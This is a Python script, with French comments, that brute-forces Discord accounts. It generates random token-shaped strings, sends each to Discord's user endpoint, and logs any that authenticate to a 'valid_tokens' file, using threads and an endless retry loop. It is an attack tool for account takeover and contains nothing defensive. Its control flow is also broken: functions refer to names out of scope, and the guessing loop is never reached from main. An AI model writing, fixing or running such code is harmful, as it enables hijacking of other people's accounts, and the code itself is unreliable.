import string
import requests
import random
import time
import threading
import os

def main():
    clear()
    create_directory_and_files()

    try:
        threads_number = int(input("Threads Number -> "))
    except ValueError:
        print("Invalid number of threads. Defaulting to 1.")
        threads_number = 1

    def token_check():
        first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
        third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
        token = f"{first}.{second}.{third}"

        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
            response.raise_for_status()
            user = response.json()
            if 'username' in user:
                print(f"Valid | {token}")
                write_to_file('tokens/valid_tokens.txt', token)
            else:
                print(f"Invalid | {token}")
                write_to_file('tokens/invalid_tokens.txt', token)
        except requests.RequestException as e:
            print(f"Error | {token} | Error: {e}")
            write_to_file('tokens/invalid_tokens.txt', token)

def request():
    threads = []
    for _ in range(threads_number):
        t = threading.Thread(target=token_check)
        t.start()
        threads.append(t)
        time.sleep(1)  # Ajout d'une pause de 1 seconde entre chaque requête

    for thread in threads:
        thread.join()

    while True:
        request()
        # Ajout d'une pause pour éviter de surcharger le serveur
        time.sleep(1)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def create_directory_and_files():
    if not os.path.exists('tokens'):
        os.makedirs('tokens')
    
    if not os.path.exists('tokens/valid_tokens.txt'):
        with open('tokens/valid_tokens.txt', 'w') as f:
            f.write("Valid Tokens:\n")
    if not os.path.exists('tokens/invalid_tokens.txt'):
        with open('tokens/invalid_tokens.txt', 'w') as f:
            f.write("Invalid Tokens:\n")

def write_to_file(filename, token):
    with open(filename, 'a') as f:
        f.write(f"{token}\n")

if __name__ == "__main__":
    import time
    main()